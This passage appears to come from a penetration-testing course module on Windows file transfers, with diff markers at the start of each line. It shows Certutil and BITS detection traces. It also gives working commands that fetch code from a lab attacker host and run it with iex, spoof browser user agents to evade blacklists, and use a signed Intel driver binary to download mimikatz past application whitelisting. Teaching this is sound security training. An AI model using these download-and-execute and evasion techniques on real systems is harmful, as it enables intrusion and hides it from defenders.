+<p><strong>Certutil - Server</strong></p>
+<p>Detection</p>
+<pre><code class="lang-shell-session"><span class="hljs-keyword">GET</span> <span class="hljs-string">/nc.exe</span> HTTP/1.1
+<span class="hljs-attribute">Cache-Control</span>: no-cache
+<span class="hljs-attribute">Connection</span>: Keep-Alive
+<span class="hljs-attribute">Pragma</span>: no-cache
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">User-Agent</span>: Microsoft-CryptoAPI/10.0
+</code></pre>
+<p><strong>BITS - Client</strong></p>
+<p>Detection</p>
+<pre><code class="lang-powershell-session"><span class="hljs-attribute">PS</span> C:\htb&gt; Import-Module bitstransfer;
+<span class="hljs-attribute">PS</span> C:\htb&gt; Start-BitsTransfer <span class="hljs-string">'http://10.10.10.32/nc.exe'</span> <span class="hljs-variable">$env</span>:temp\t;
+<span class="hljs-attribute">PS</span> C:\htb&gt; <span class="hljs-variable">$r</span>=gc <span class="hljs-variable">$env</span>:temp\t;
+<span class="hljs-attribute">PS</span> C:\htb&gt; rm <span class="hljs-variable">$env</span>:temp\t; 
+<span class="hljs-attribute">PS</span> C:\htb&gt; iex <span class="hljs-variable">$r</span>
+</code></pre>
+<p><strong>BITS - Server</strong></p>
+<p>Detection</p>
+<pre><code class="lang-shell-session"><span class="hljs-keyword">HEAD</span> <span class="hljs-string">/nc.exe</span> HTTP/1.1
+<span class="hljs-attribute">Connection</span>: Keep-Alive
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Accept-Encoding</span>: identity
+<span class="hljs-attribute">User-Agent</span>: Microsoft BITS/7.8
+</code></pre>
+<p>This section just scratches the surface on detecting malicious file transfers. It would be an excellent start for any organization to create a whitelist of allowed binaries or a blacklist of binaries known to be used for malicious purposes. Furthermore, hunting for anomalous user agent strings can be an excellent way to catch an attack in progress. We will cover threat hunting and detection techniques in-depth in later modules.</p>
+<h2 id="evading-detection">Evading Detection</h2>
+<hr>
+<h3 id="changing-user-agent">Changing User Agent</h3>
+<p>If diligent administrators or defenders have blacklisted any of these User Agents, <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1">Invoke-WebRequest</a> contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.</p>
+<p><strong>Listing out User Agents</strong></p>
+<p>Evading Detection</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt;[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{<span class="hljs-attr">label=</span><span class="hljs-string">"User Agent"</span>;<span class="hljs-attr">Expression=</span>{[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+Name       : InternetExplorer
+<span class="hljs-keyword">User</span> <span class="hljs-title">Agent</span> : Mozilla/<span class="hljs-number">5.0</span> (compatible; MSIE <span class="hljs-number">9.0</span>; Windows NT; Windows NT <span class="hljs-number">10.0</span>; en-US)
+
+Name       : FireFox
+<span class="hljs-keyword">User</span> <span class="hljs-title">Agent</span> : Mozilla/<span class="hljs-number">5.0</span> (Windows NT; Windows NT <span class="hljs-number">10.0</span>; en-US) Gecko/<span class="hljs-number">20100401</span> Firefox/<span class="hljs-number">4.0</span>
+
+Name       : Chrome
+<span class="hljs-keyword">User</span> <span class="hljs-title">Agent</span> : Mozilla/<span class="hljs-number">5.0</span> (Windows NT; Windows NT <span class="hljs-number">10.0</span>; en-US) AppleWebKit/<span class="hljs-number">534.6</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">7.0</span>.<span class="hljs-number">500.0</span>
+             Safari/<span class="hljs-number">534.6</span>
+
+Name       : Opera
+<span class="hljs-keyword">User</span> <span class="hljs-title">Agent</span> : Opera/<span class="hljs-number">9.70</span> (Windows NT; Windows NT <span class="hljs-number">10.0</span>; en-US) Presto/<span class="hljs-number">2.2</span>.<span class="hljs-number">1</span>
+
+Name       : Safari
+<span class="hljs-keyword">User</span> <span class="hljs-title">Agent</span> : Mozilla/<span class="hljs-number">5.0</span> (Windows NT; Windows NT <span class="hljs-number">10.0</span>; en-US) AppleWebKit/<span class="hljs-number">533.16</span> (KHTML, like Gecko) <span class="hljs-keyword">Version</span>/<span class="hljs-number">5.0</span>
+             Safari/<span class="hljs-number">533.16</span>
+</code></pre>
+<p>Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:</p>
+<p><strong>Request with Chrome User Agent</strong></p>
+<p>Evading Detection</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-variable">$UserAgent</span> = [Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Commands</span><span class="hljs-selector-class">.PSUserAgent</span>]::Chrome
+PS C:\htb&gt; Invoke-WebRequest http:<span class="hljs-comment">//10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"</span>
+</code></pre>
+<p>Evading Detection</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lvnp <span class="hljs-number">80</span>
+
+listening on [any] <span class="hljs-number">80</span> ...
+connect to [<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.32</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.132</span>] <span class="hljs-number">51313</span>
+GET /nc.exe HTTP/<span class="hljs-number">1.1</span>
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT<span class="hljs-comment">; Windows NT 10.0; en-US) AppleWebKit/534.6</span>
+(KHTML, Like Gecko) Chrome/<span class="hljs-number">7.0</span><span class="hljs-meta">.500</span><span class="hljs-meta">.0</span> Safari/<span class="hljs-number">534.6</span>
+<span class="hljs-symbol">Host:</span> <span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.32</span>
+<span class="hljs-symbol">Connection:</span> Keep-Alive
+</code></pre>
+<hr>
+<h3 id="lolbas-gtfobins">LOLBAS / GTFOBins</h3>
+<p>Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:</p>
+<p><strong>Transferring File with GfxDownloadWrapper.exe</strong></p>
+<p>Evading Detection</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; GfxDownloadWrapper<span class="hljs-selector-class">.exe</span> <span class="hljs-string">"http://10.10.10.132/mimikatz.exe"</span> <span class="hljs-string">"C:\Temp\nc.exe"</span>
+</code></pre>
+<p>Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the <a href="https://lolbas-project.github.io/">LOLBAS</a> project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the <a href="https://gtfobins.github.io/">GTFOBins</a> project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.</p>
+<hr>
+<h3 id="closing-thoughts">Closing Thoughts</h3>
+<p>As we've seen in this module, there are many ways to transfer files to and from our attack host between Windows and Linux systems. It's worth practicing as many of these as possible throughout the modules in the Penetration Tester path. Got a web shell on a target? Try downloading a file to the target for additional enumeration using Certutil. Need to download a file off the target? Try an Impacket SMB server or a Python web server with upload capabilities. Refer back to this module periodically and strive to use all the methods taught in some fashion. Also, take some time whenever you're working on a target or lab to search for a LOLBin or GTFOBin that you've never worked with before to accomplish your file transfer goals.</p>
+</div></body></html>
